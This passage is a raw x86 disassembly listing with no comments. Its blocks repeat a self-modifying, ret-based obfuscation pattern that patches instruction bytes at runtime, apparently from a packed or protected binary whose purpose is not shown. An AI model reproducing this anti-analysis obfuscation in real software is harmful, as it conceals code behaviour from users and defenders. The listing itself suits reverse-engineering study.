  40ce3c:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40ce42:	8d 80 d3 10 2b ff    	lea    -0xd4ef2d(%eax),%eax
  40ce48:	87 05 51 ce 40 00    	xchg   %eax,0x40ce51
  40ce4e:	58                   	pop    %eax
  40ce4f:	f3 90                	pause
  40ce51:	38 65 6f             	cmp    %ah,0x6f(%ebp)
  40ce54:	d1 ff                	sar    $1,%edi
  40ce56:	50                   	push   %eax
  40ce57:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40ce5b:	66 87 05 51 ce 40 00 	xchg   %ax,0x40ce51
  40ce62:	b8 d8 cb 2b 92       	mov    $0x922bcbd8,%eax
  40ce67:	87 04 24             	xchg   %eax,(%esp)
  40ce6a:	c3                   	ret
  40ce6b:	8f 05 99 ce 40 00    	pop    0x40ce99
  40ce71:	50                   	push   %eax
  40ce72:	90                   	nop
  40ce73:	b8 15 20 40 00       	mov    $0x402015,%eax
  40ce78:	8d 80 a9 e0 ff 3f    	lea    0x3fffe0a9(%eax),%eax
  40ce7e:	87 05 87 ce 40 00    	xchg   %eax,0x40ce87
  40ce84:	58                   	pop    %eax
  40ce85:	f3 90                	pause
  40ce87:	69 98 f5 97 00 50 66 	imul   $0xe8ebb866,0x500097f5(%eax),%ebx
  40ce8e:	b8 eb e8 
  40ce91:	66 87 05 87 ce 40 00 	xchg   %ax,0x40ce87
  40ce98:	b8 1f 11 7c e3       	mov    $0xe37c111f,%eax
  40ce9d:	87 04 24             	xchg   %eax,(%esp)
  40cea0:	c3                   	ret
  40cea1:	8f 05 cf ce 40 00    	pop    0x40cecf
  40cea7:	50                   	push   %eax
  40cea8:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40ceae:	8d 80 53 f9 f1 3f    	lea    0x3ff1f953(%eax),%eax
  40ceb4:	87 05 bd ce 40 00    	xchg   %eax,0x40cebd
  40ceba:	58                   	pop    %eax
  40cebb:	f3 90                	pause
  40cebd:	85 c6                	test   %eax,%esi
  40cebf:	67 c4 00             	les    (%bx,%si),%eax
  40cec2:	50                   	push   %eax
  40cec3:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40cec7:	66 87 05 bd ce 40 00 	xchg   %ax,0x40cebd
  40cece:	b8 34 c0 25 4b       	mov    $0x4b25c034,%eax
  40ced3:	87 04 24             	xchg   %eax,(%esp)
  40ced6:	c3                   	ret
  40ced7:	8f 05 05 cf 40 00    	pop    0x40cf05
  40cedd:	50                   	push   %eax
  40cede:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40cee4:	8d 80 53 28 c1 ff    	lea    -0x3ed7ad(%eax),%eax
  40ceea:	87 05 f3 ce 40 00    	xchg   %eax,0x40cef3
  40cef0:	58                   	pop    %eax
  40cef1:	f3 90                	pause
  40cef3:	29 5d 95             	sub    %ebx,-0x6b(%ebp)
  40cef6:	e5 00                	in     $0x0,%eax
  40cef8:	50                   	push   %eax
  40cef9:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40cefd:	66 87 05 f3 ce 40 00 	xchg   %ax,0x40cef3
  40cf04:	b8 9c 39 20 a2       	mov    $0xa220399c,%eax
  40cf09:	87 04 24             	xchg   %eax,(%esp)
  40cf0c:	c3                   	ret
  40cf0d:	8f 05 3b cf 40 00    	pop    0x40cf3b
  40cf13:	50                   	push   %eax
  40cf14:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40cf1a:	8d 80 d3 0e 25 ff    	lea    -0xdaf12d(%eax),%eax
  40cf20:	87 05 29 cf 40 00    	xchg   %eax,0x40cf29
  40cf26:	58                   	pop    %eax
  40cf27:	f3 90                	pause
  40cf29:	7f 65                	jg     0x40cf90
  40cf2b:	e2 4b                	loop   0x40cf78
  40cf2d:	ff 50 66             	call   *0x66(%eax)
  40cf30:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40cf35:	05 29 cf 40 00       	add    $0x40cf29,%eax
  40cf3a:	b8 bd ce 00 af       	mov    $0xaf00cebd,%eax
  40cf3f:	87 04 24             	xchg   %eax,(%esp)
  40cf42:	c3                   	ret
  40cf43:	8f 05 71 cf 40 00    	pop    0x40cf71
  40cf49:	50                   	push   %eax
  40cf4a:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40cf50:	8d 80 8e 50 17 40    	lea    0x4017508e(%eax),%eax
  40cf56:	87 05 5f cf 40 00    	xchg   %eax,0x40cf5f
  40cf5c:	58                   	pop    %eax
  40cf5d:	f3 90                	pause
  40cf5f:	c8 e0 2f e9          	enter  $0x2fe0,$0xe9
  40cf63:	00 50 66             	add    %dl,0x66(%eax)
  40cf66:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40cf6b:	05 5f cf 40 00       	add    $0x40cf5f,%eax
  40cf70:	b8 5e d6 e6 bf       	mov    $0xbfe6d65e,%eax
  40cf75:	87 04 24             	xchg   %eax,(%esp)
  40cf78:	c3                   	ret
  40cf79:	8f 05 a7 cf 40 00    	pop    0x40cfa7
  40cf7f:	50                   	push   %eax
  40cf80:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40cf86:	8d 80 6e 5c e4 03    	lea    0x3e45c6e(%eax),%eax
  40cf8c:	87 05 95 cf 40 00    	xchg   %eax,0x40cf95
  40cf92:	58                   	pop    %eax
  40cf93:	f3 90                	pause
  40cf95:	5b                   	pop    %ebx
  40cf96:	58                   	pop    %eax
  40cf97:	b1 2d                	mov    $0x2d,%cl
  40cf99:	00 50 66             	add    %dl,0x66(%eax)
  40cf9c:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40cfa1:	05 95 cf 40 00       	add    $0x40cf95,%eax
  40cfa6:	b8 77 8c 41 b3       	mov    $0xb3418c77,%eax
  40cfab:	87 04 24             	xchg   %eax,(%esp)
  40cfae:	c3                   	ret
  40cfaf:	8f 05 de cf 40 00    	pop    0x40cfde
  40cfb5:	50                   	push   %eax
  40cfb6:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40cfbc:	8d 80 fa 63 48 42    	lea    0x424863fa(%eax),%eax
  40cfc2:	87 05 cb cf 40 00    	xchg   %eax,0x40cfcb
  40cfc8:	58                   	pop    %eax
  40cfc9:	f3 90                	pause
  40cfcb:	24 76                	and    $0x76,%al
  40cfcd:	72 13                	jb     0x40cfe2
  40cfcf:	ff                   	(bad)
  40cfd0:	ff 50 66             	call   *0x66(%eax)
  40cfd3:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40cfd8:	05 cb cf 40 00       	add    $0x40cfcb,%eax
  40cfdd:	b8 d5 77 f3 c7       	mov    $0xc7f377d5,%eax
  40cfe2:	8d 40 01             	lea    0x1(%eax),%eax
  40cfe5:	87 04 24             	xchg   %eax,(%esp)
  40cfe8:	c3                   	ret
  40cfe9:	8f 05 17 d0 40 00    	pop    0x40d017
  40cfef:	50                   	push   %eax
  40cff0:	90                   	nop
  40cff1:	b8 15 20 40 00       	mov    $0x402015,%eax
  40cff6:	8d 80 d3 16 27 ff    	lea    -0xd8e92d(%eax),%eax
  40cffc:	87 05 05 d0 40 00    	xchg   %eax,0x40d005
  40d002:	58                   	pop    %eax
  40d003:	f3 90                	pause
  40d005:	16                   	push   %ss
  40d006:	60                   	pusha
  40d007:	a2 25 ff 50 66       	mov    %al,0x6650ff25
  40d00c:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d011:	05 05 d0 40 00       	add    $0x40d005,%eax
  40d016:	b8 7b 1a 7d 42       	mov    $0x427d1a7b,%eax
  40d01b:	87 04 24             	xchg   %eax,(%esp)
  40d01e:	c3                   	ret
  40d01f:	8f 05 4d d0 40 00    	pop    0x40d04d
  40d025:	50                   	push   %eax
  40d026:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d02c:	8d 80 d3 e0 26 ff    	lea    -0xd91f2d(%eax),%eax
  40d032:	87 05 3b d0 40 00    	xchg   %eax,0x40d03b
  40d038:	58                   	pop    %eax
  40d039:	f3 90                	pause
  40d03b:	6e                   	outsb  %ds:(%esi),(%dx)
  40d03c:	0c 55                	or     $0x55,%al
  40d03e:	80 ff 50             	cmp    $0x50,%bh
  40d041:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40d045:	66 87 05 3b d0 40 00 	xchg   %ax,0x40d03b
  40d04c:	b8 a0 4a de da       	mov    $0xdade4aa0,%eax
  40d051:	87 04 24             	xchg   %eax,(%esp)
  40d054:	c3                   	ret
  40d055:	8f 05 83 d0 40 00    	pop    0x40d083
  40d05b:	50                   	push   %eax
  40d05c:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d062:	8d 80 d3 aa 26 ff    	lea    -0xd9552d(%eax),%eax
  40d068:	87 05 71 d0 40 00    	xchg   %eax,0x40d071
  40d06e:	58                   	pop    %eax
  40d06f:	f3 90                	pause
  40d071:	bd 92 c8 f9 ff       	mov    $0xfff9c892,%ebp
  40d076:	50                   	push   %eax
  40d077:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40d07b:	66 87 05 71 d0 40 00 	xchg   %ax,0x40d071
  40d082:	b8 cd 1a c4 04       	mov    $0x4c41acd,%eax
  40d087:	87 04 24             	xchg   %eax,(%esp)
  40d08a:	c3                   	ret
  40d08b:	8f 05 b9 d0 40 00    	pop    0x40d0b9
  40d091:	50                   	push   %eax
  40d092:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d098:	8d 80 d3 75 22 ff    	lea    -0xdd8a2d(%eax),%eax
  40d09e:	87 05 a7 d0 40 00    	xchg   %eax,0x40d0a7
  40d0a4:	58                   	pop    %eax
  40d0a5:	f3 90                	pause
  40d0a7:	d7                   	xlat   %ds:(%ebx)
  40d0a8:	78 38                	js     0x40d0e2
  40d0aa:	ff                   	(bad)
  40d0ab:	ff 50 66             	call   *0x66(%eax)
  40d0ae:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d0b3:	05 a7 d0 40 00       	add    $0x40d0a7,%eax
  40d0b8:	b8 86 85 86 7d       	mov    $0x7d868586,%eax
  40d0bd:	87 04 24             	xchg   %eax,(%esp)
  40d0c0:	c3                   	ret
  40d0c1:	8f 05 f0 d0 40 00    	pop    0x40d0f0
  40d0c7:	50                   	push   %eax
  40d0c8:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d0ce:	8d 80 ea 15 30 57    	lea    0x573015ea(%eax),%eax
  40d0d4:	87 05 dd d0 40 00    	xchg   %eax,0x40d0dd
  40d0da:	58                   	pop    %eax
  40d0db:	f3 90                	pause
  40d0dd:	2e 07                	cs pop %es
  40d0df:	88 d4                	mov    %dl,%ah
  40d0e1:	40                   	inc    %eax
  40d0e2:	00 50 66             	add    %dl,0x66(%eax)
  40d0e5:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d0ea:	05 dd d0 40 00       	add    $0x40d0dd,%eax
  40d0ef:	b8 b8 18 0a f3       	mov    $0xf30a18b8,%eax
  40d0f4:	8d 40 01             	lea    0x1(%eax),%eax
  40d0f7:	87 04 24             	xchg   %eax,(%esp)
  40d0fa:	c3                   	ret
  40d0fb:	8f 05 29 d1 40 00    	pop    0x40d129
  40d101:	50                   	push   %eax
  40d102:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d108:	8d 80 d3 bf 22 ff    	lea    -0xdd402d(%eax),%eax
  40d10e:	87 05 17 d1 40 00    	xchg   %eax,0x40d117
  40d114:	58                   	pop    %eax
  40d115:	f3 90                	pause
  40d117:	d7                   	xlat   %ds:(%ebx)
  40d118:	8f                   	(bad)
  40d119:	d9 da                	(bad)
  40d11b:	ff 50 66             	call   *0x66(%eax)
  40d11e:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d123:	05 17 d1 40 00       	add    $0x40d117,%eax
  40d128:	b8 25 40 b9 23       	mov    $0x23b94025,%eax
  40d12d:	87 04 24             	xchg   %eax,(%esp)
  40d130:	c3                   	ret
  40d131:	8f 05 61 d1 40 00    	pop    0x40d161
  40d137:	50                   	push   %eax
  40d138:	90                   	nop
  40d139:	b8 15 20 40 00       	mov    $0x402015,%eax
  40d13e:	8d 80 b2 26 c4 00    	lea    0xc426b2(%eax),%eax
  40d144:	87 05 4d d1 40 00    	xchg   %eax,0x40d14d
  40d14a:	58                   	pop    %eax
  40d14b:	f3 90                	pause
  40d14d:	3a ef                	cmp    %bh,%ch
  40d14f:	37                   	aaa
  40d150:	16                   	push   %ss
  40d151:	00 00                	add    %al,(%eax)
  40d153:	00 50 66             	add    %dl,0x66(%eax)
  40d156:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d15b:	05 4d d1 40 00       	add    $0x40d14d,%eax
  40d160:	b8 2d df ce e0       	mov    $0xe0cedf2d,%eax
  40d165:	8d 40 02             	lea    0x2(%eax),%eax
  40d168:	87 04 24             	xchg   %eax,(%esp)
  40d16b:	c3                   	ret
  40d16c:	8f 05 9b d1 40 00    	pop    0x40d19b
  40d172:	50                   	push   %eax
  40d173:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d179:	8d 80 ea f5 67 52    	lea    0x5267f5ea(%eax),%eax
  40d17f:	87 05 88 d1 40 00    	xchg   %eax,0x40d188
  40d185:	58                   	pop    %eax
  40d186:	f3 90                	pause
  40d188:	eb e2                	jmp    0x40d16c
  40d18a:	eb 77                	jmp    0x40d203
  40d18c:	40                   	inc    %eax
  40d18d:	00 50 66             	add    %dl,0x66(%eax)
  40d190:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d195:	05 88 d1 40 00       	add    $0x40d188,%eax
  40d19a:	b8 07 ab fb c4       	mov    $0xc4fbab07,%eax
  40d19f:	8d 40 01             	lea    0x1(%eax),%eax
  40d1a2:	87 04 24             	xchg   %eax,(%esp)
  40d1a5:	c3                   	ret
  40d1a6:	8f 05 d5 d1 40 00    	pop    0x40d1d5
  40d1ac:	50                   	push   %eax
  40d1ad:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d1b3:	8d 80 fa 63 48 40    	lea    0x404863fa(%eax),%eax
  40d1b9:	87 05 c2 d1 40 00    	xchg   %eax,0x40d1c2
  40d1bf:	58                   	pop    %eax
  40d1c0:	f3 90                	pause
  40d1c2:	f7 2b                	imull  (%ebx)
  40d1c4:	b5 52                	mov    $0x52,%ch
  40d1c6:	ff                   	(bad)
  40d1c7:	ff 50 66             	call   *0x66(%eax)
  40d1ca:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d1cf:	05 c2 d1 40 00       	add    $0x40d1c2,%eax
  40d1d4:	b8 1b 41 af 72       	mov    $0x72af411b,%eax
  40d1d9:	8d 40 01             	lea    0x1(%eax),%eax
  40d1dc:	87 04 24             	xchg   %eax,(%esp)
  40d1df:	c3                   	ret
  40d1e0:	8f 05 0e d2 40 00    	pop    0x40d20e
  40d1e6:	50                   	push   %eax
  40d1e7:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d1ed:	8d 80 d3 f8 1f ff    	lea    -0xe0072d(%eax),%eax
  40d1f3:	87 05 fc d1 40 00    	xchg   %eax,0x40d1fc
  40d1f9:	58                   	pop    %eax
  40d1fa:	f3 90                	pause
  40d1fc:	82 c1 6e             	add    $0x6e,%cl
  40d1ff:	55                   	push   %ebp
  40d200:	ff 50 66             	call   *0x66(%eax)
  40d203:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d208:	05 fc d1 40 00       	add    $0x40d1fc,%eax
  40d20d:	b8 a9 63 06 de       	mov    $0xde0663a9,%eax
  40d212:	87 04 24             	xchg   %eax,(%esp)
  40d215:	c3                   	ret
  40d216:	8f 05 45 d2 40 00    	pop    0x40d245
  40d21c:	50                   	push   %eax
  40d21d:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d223:	8d 80 ea 15 30 57    	lea    0x573015ea(%eax),%eax
  40d229:	87 05 32 d2 40 00    	xchg   %eax,0x40d232
  40d22f:	58                   	pop    %eax
  40d230:	f3 90                	pause
  40d232:	98                   	cwtl
  40d233:	0c b3                	or     $0xb3,%al
  40d235:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40d236:	40                   	inc    %eax
  40d237:	00 50 66             	add    %dl,0x66(%eax)
  40d23a:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d23f:	05 32 d2 40 00       	add    $0x40d232,%eax
  40d244:	b8 82 5e 53 c8       	mov    $0xc8535e82,%eax
  40d249:	8d 40 01             	lea    0x1(%eax),%eax
  40d24c:	87 04 24             	xchg   %eax,(%esp)
  40d24f:	c3                   	ret
  40d250:	8f 05 7e d2 40 00    	pop    0x40d27e
  40d256:	50                   	push   %eax
  40d257:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d25d:	8d 80 d3 6a 21 ff    	lea    -0xde952d(%eax),%eax
  40d263:	87 05 6c d2 40 00    	xchg   %eax,0x40d26c
  40d269:	58                   	pop    %eax
  40d26a:	f3 90                	pause
  40d26c:	b3 77                	mov    $0x77,%bl
  40d26e:	b5 8f                	mov    $0x8f,%ch
  40d270:	ff 50 66             	call   *0x66(%eax)
  40d273:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d278:	05 6c d2 40 00       	add    $0x40d26c,%eax
  40d27d:	b8 44 3d b4 5b       	mov    $0x5bb43d44,%eax
  40d282:	87 04 24             	xchg   %eax,(%esp)
  40d285:	c3                   	ret
  40d286:	8f 05 b5 d2 40 00    	pop    0x40d2b5
  40d28c:	50                   	push   %eax
  40d28d:	90                   	nop
  40d28e:	b8 15 20 40 00       	mov    $0x402015,%eax
  40d293:	8d 80 ea 15 30 57    	lea    0x573015ea(%eax),%eax
  40d299:	87 05 a2 d2 40 00    	xchg   %eax,0x40d2a2
  40d29f:	58                   	pop    %eax
  40d2a0:	f3 90                	pause
  40d2a2:	d2 a2 ab 10 40 00    	shlb   %cl,0x4010ab(%edx)
  40d2a8:	50                   	push   %eax
  40d2a9:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40d2ad:	66 87 05 a2 d2 40 00 	xchg   %ax,0x40d2a2
  40d2b4:	b8 c4 50 d5 bc       	mov    $0xbcd550c4,%eax
  40d2b9:	8d 40 01             	lea    0x1(%eax),%eax
  40d2bc:	87 04 24             	xchg   %eax,(%esp)
  40d2bf:	c3                   	ret
  40d2c0:	8f 05 ee d2 40 00    	pop    0x40d2ee
  40d2c6:	50                   	push   %eax
  40d2c7:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d2cd:	8d 80 d3 25 21 ff    	lea    -0xdeda2d(%eax),%eax
  40d2d3:	87 05 dc d2 40 00    	xchg   %eax,0x40d2dc
  40d2d9:	58                   	pop    %eax
  40d2da:	f3 90                	pause
  40d2dc:	b7 c9                	mov    $0xc9,%bh
  40d2de:	25 8a ff 50 66       	and    $0x6650ff8a,%eax
  40d2e3:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d2e8:	05 dc d2 40 00       	add    $0x40d2dc,%eax
  40d2ed:	b8 61 a2 d3 96       	mov    $0x96d3a261,%eax
  40d2f2:	87 04 24             	xchg   %eax,(%esp)
  40d2f5:	c3                   	ret
  40d2f6:	8f 05 25 d3 40 00    	pop    0x40d325
  40d2fc:	50                   	push   %eax
  40d2fd:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d303:	8d 80 ea f5 57 52    	lea    0x5257f5ea(%eax),%eax
  40d309:	87 05 12 d3 40 00    	xchg   %eax,0x40d312
  40d30f:	58                   	pop    %eax
  40d310:	f3 90                	pause
  40d312:	bc 4f cf d0 40       	mov    $0x40d0cf4f,%esp
  40d317:	00 50 66             	add    %dl,0x66(%eax)
  40d31a:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d31f:	05 12 d3 40 00       	add    $0x40d312,%eax
  40d324:	b8 8a de fb 84       	mov    $0x84fbde8a,%eax
  40d329:	8d 40 01             	lea    0x1(%eax),%eax
  40d32c:	87 04 24             	xchg   %eax,(%esp)
  40d32f:	c3                   	ret
  40d330:	8f 05 5e d3 40 00    	pop    0x40d35e
  40d336:	50                   	push   %eax
  40d337:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d33d:	8d 80 8c 54 17 40    	lea    0x4017548c(%eax),%eax
  40d343:	87 05 4c d3 40 00    	xchg   %eax,0x40d34c
  40d349:	58                   	pop    %eax
  40d34a:	f3 90                	pause
  40d34c:	2b 31                	sub    (%ecx),%esi
  40d34e:	54                   	push   %esp
  40d34f:	b7 00                	mov    $0x0,%bh
  40d351:	50                   	push   %eax
  40d352:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40d356:	66 87 05 4c d3 40 00 	xchg   %ax,0x40d34c
  40d35d:	b8 db c4 67 d8       	mov    $0xd867c4db,%eax
  40d362:	87 04 24             	xchg   %eax,(%esp)
  40d365:	c3                   	ret
  40d366:	8f 05 94 d3 40 00    	pop    0x40d394
  40d36c:	50                   	push   %eax
  40d36d:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d373:	8d 80 d3 fe 1d ff    	lea    -0xe2012d(%eax),%eax
  40d379:	87 05 82 d3 40 00    	xchg   %eax,0x40d382
  40d37f:	58                   	pop    %eax
  40d380:	f3 90                	pause
  40d382:	d0 76 5f             	shlb   $1,0x5f(%esi)
  40d385:	82 ff 50             	cmp    $0x50,%bh
  40d388:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40d38c:	66 87 05 82 d3 40 00 	xchg   %ax,0x40d382
  40d393:	b8 d4 a0 07 e2       	mov    $0xe207a0d4,%eax
  40d398:	87 04 24             	xchg   %eax,(%esp)
  40d39b:	c3                   	ret
  40d39c:	8f 05 cb d3 40 00    	pop    0x40d3cb
  40d3a2:	50                   	push   %eax
  40d3a3:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d3a9:	8d 80 ea 15 30 57    	lea    0x573015ea(%eax),%eax
  40d3af:	87 05 b8 d3 40 00    	xchg   %eax,0x40d3b8
  40d3b5:	58                   	pop    %eax
  40d3b6:	f3 90                	pause
  40d3b8:	2b 5f e9             	sub    -0x17(%edi),%ebx
  40d3bb:	8c 40 00             	mov    %es,0x0(%eax)
  40d3be:	50                   	push   %eax
  40d3bf:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40d3c3:	66 87 05 b8 d3 40 00 	xchg   %ax,0x40d3b8
  40d3ca:	b8 e6 92 e3 a6       	mov    $0xa6e392e6,%eax
  40d3cf:	8d 40 01             	lea    0x1(%eax),%eax
  40d3d2:	87 04 24             	xchg   %eax,(%esp)
  40d3d5:	c3                   	ret
  40d3d6:	8f 05 04 d4 40 00    	pop    0x40d404
  40d3dc:	50                   	push   %eax
  40d3dd:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d3e3:	8d 80 d3 e4 1f ff    	lea    -0xe01b2d(%eax),%eax
  40d3e9:	87 05 f2 d3 40 00    	xchg   %eax,0x40d3f2
  40d3ef:	58                   	pop    %eax
  40d3f0:	f3 90                	pause
  40d3f2:	76 c8                	jbe    0x40d3bc
  40d3f4:	fc                   	cld
  40d3f5:	d4 ff                	aam    $0xff
  40d3f7:	50                   	push   %eax
  40d3f8:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40d3fc:	66 87 05 f2 d3 40 00 	xchg   %ax,0x40d3f2
  40d403:	b8 a7 a8 cc d8       	mov    $0xd8cca8a7,%eax
  40d408:	87 04 24             	xchg   %eax,(%esp)
  40d40b:	c3                   	ret
  40d40c:	8f 05 3a d4 40 00    	pop    0x40d43a
  40d412:	50                   	push   %eax
  40d413:	90                   	nop
  40d414:	b8 15 20 40 00       	mov    $0x402015,%eax
  40d419:	8d 80 d3 23 24 ff    	lea    -0xdbdc2d(%eax),%eax
  40d41f:	87 05 28 d4 40 00    	xchg   %eax,0x40d428
  40d425:	58                   	pop    %eax
  40d426:	f3 90                	pause
  40d428:	a3 16 05 95 ff       	mov    %eax,0xff950516
  40d42d:	50                   	push   %eax
  40d42e:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40d432:	66 87 05 28 d4 40 00 	xchg   %ax,0x40d428
  40d439:	b8 bc b5 31 b7       	mov    $0xb731b5bc,%eax
  40d43e:	87 04 24             	xchg   %eax,(%esp)
  40d441:	c3                   	ret
  40d442:	8f 05 70 d4 40 00    	pop    0x40d470
  40d448:	50                   	push   %eax
  40d449:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d44f:	8d 80 d3 fd 24 ff    	lea    -0xdb022d(%eax),%eax
  40d455:	87 05 5e d4 40 00    	xchg   %eax,0x40d45e
  40d45b:	58                   	pop    %eax
  40d45c:	f3 90                	pause
  40d45e:	c6                   	(bad)
  40d45f:	b1 59                	mov    $0x59,%cl
  40d461:	96                   	xchg   %eax,%esi
  40d462:	ff 50 66             	call   *0x66(%eax)
  40d465:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d46a:	05 5e d4 40 00       	add    $0x40d45e,%eax
  40d46f:	b8 69 96 08 37       	mov    $0x37089669,%eax
  40d474:	87 04 24             	xchg   %eax,(%esp)
  40d477:	c3                   	ret
  40d478:	8f 05 a6 d4 40 00    	pop    0x40d4a6
  40d47e:	50                   	push   %eax
  40d47f:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d485:	8d 80 d3 c1 24 ff    	lea    -0xdb3e2d(%eax),%eax
  40d48b:	87 05 94 d4 40 00    	xchg   %eax,0x40d494
  40d491:	58                   	pop    %eax
  40d492:	f3 90                	pause
  40d494:	2c 0f                	sub    $0xf,%al
  40d496:	cd cb                	int    $0xcb
  40d498:	ff 50 66             	call   *0x66(%eax)
  40d49b:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d4a0:	05 94 d4 40 00       	add    $0x40d494,%eax
  40d4a5:	b8 66 e6 7f d3       	mov    $0xd37fe666,%eax
  40d4aa:	87 04 24             	xchg   %eax,(%esp)
  40d4ad:	c3                   	ret
  40d4ae:	8f 05 dc d4 40 00    	pop    0x40d4dc
  40d4b4:	50                   	push   %eax
  40d4b5:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d4bb:	8d 80 d3 41 21 ff    	lea    -0xdebe2d(%eax),%eax
  40d4c1:	87 05 ca d4 40 00    	xchg   %eax,0x40d4ca
  40d4c7:	58                   	pop    %eax
  40d4c8:	f3 90                	pause
  40d4ca:	b8 06 cb 22 ff       	mov    $0xff22cb06,%eax
  40d4cf:	50                   	push   %eax
  40d4d0:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40d4d4:	66 87 05 ca d4 40 00 	xchg   %ax,0x40d4ca
  40d4db:	b8 b0 98 68 12       	mov    $0x126898b0,%eax
  40d4e0:	87 04 24             	xchg   %eax,(%esp)
  40d4e3:	c3                   	ret
  40d4e4:	8f 05 12 d5 40 00    	pop    0x40d512
  40d4ea:	50                   	push   %eax
  40d4eb:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d4f1:	8d 80 a5 fe 0f 40    	lea    0x400ffea5(%eax),%eax
  40d4f7:	87 05 00 d5 40 00    	xchg   %eax,0x40d500
  40d4fd:	58                   	pop    %eax
  40d4fe:	f3 90                	pause
  40d500:	af                   	scas   %es:(%edi),%eax
  40d501:	64 09 fe             	fs or  %edi,%esi
  40d504:	00 50 66             	add    %dl,0x66(%eax)
  40d507:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d50c:	05 00 d5 40 00       	add    $0x40d500,%eax
  40d511:	b8 0a 1d 3d 03       	mov    $0x33d1d0a,%eax
  40d516:	87 04 24             	xchg   %eax,(%esp)
  40d519:	c3                   	ret
  40d51a:	8f 05 48 d5 40 00    	pop    0x40d548
  40d520:	50                   	push   %eax
  40d521:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40d527:	8d 80 d3 55 21 ff    	lea    -0xdeaa2d(%eax),%eax
  40d52d:	87 05 36 d5 40 00    	xchg   %eax,0x40d536
  40d533:	58                   	pop    %eax
  40d534:	f3 90                	pause
  40d536:	92                   	xchg   %eax,%edx
  40d537:	75 2c                	jne    0x40d565
  40d539:	17                   	pop    %ss
  40d53a:	ff 50 66             	call   *0x66(%eax)
  40d53d:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40d542:	05 36 d5 40 00       	add    $0x40d536,%eax
  40d547:	b8 e6 89 7c 3f       	mov    $0x3f7c89e6,%eax
  40d54c:	87 04 24             	xchg   %eax,(%esp)
  40d54f:	c3                   	ret
  40d550:	8f 05 7e d5 40 00    	pop    0x40d57e
  40d556:	50                   	push   %eax
  40d557:	90                   	nop
  40d558:	b8 15 20 40 00       	mov    $0x402015,%eax
  40d55d:	8d 80 a3 e1 bf ff    	lea    -0x401e5d(%eax),%eax
  40d563:	87 05 6c d5 40 00    	xchg   %eax,0x40d56c
  40d569:	58                   	pop    %eax
  40d56a:	f3 90                	pause
  40d56c:	96                   	xchg   %eax,%esi
  40d56d:	b3 1e                	mov    $0x1e,%bl
  40d56f:	8f 00                	pop    (%eax)
  40d571:	50                   	push   %eax
  40d572:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40d576:	66 87 05 6c d5 40 00 	xchg   %ax,0x40d56c
  40d57d:	b8 a3 d8 91 4c       	mov    $0x4c91d8a3,%eax
  40d582:	87 04 24             	xchg   %eax,(%esp)
  40d585:	c3                   	ret
  40d586:	8f 05 b4 d5 40 00    	pop    0x40d5b4
  40d58c:	50                   	push   %eax
  40d58d:	90                   	nop
  40d58e:	b8 15 20 40 00       	mov    $0x402015,%eax
  40d593:	8d 80 a4 48 10 40    	lea    0x401048a4(%eax),%eax
  40d599:	87 05 a2 d5 40 00    	xchg   %eax,0x40d5a2
  40d59f:	58                   	pop    %eax
  40d5a0:	f3 90                	pause
  40d5a2:	fe                   	(bad)
  40d5a3:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40d5a4:	52                   	push   %edx
